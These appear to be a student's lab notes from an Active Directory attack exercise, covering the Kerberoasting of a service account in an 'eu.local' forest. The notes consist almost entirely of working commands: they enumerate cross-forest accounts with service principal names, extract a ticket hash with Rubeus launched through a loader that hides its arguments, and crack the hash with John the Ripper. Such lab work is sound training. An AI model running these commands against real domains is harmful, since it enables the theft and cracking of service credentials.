
Task 

• Find a service account in the eu.local forest and Kerberoast its password.


Using ADModule

```
 Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}
```

![[Pasted image 20250323203756.png]]

```
echo %Pwn% Kerberoast
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt
```

![[Pasted image 20250323203916.png]]

```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\euhashes.txt
```

![[Pasted image 20250323203951.png]]

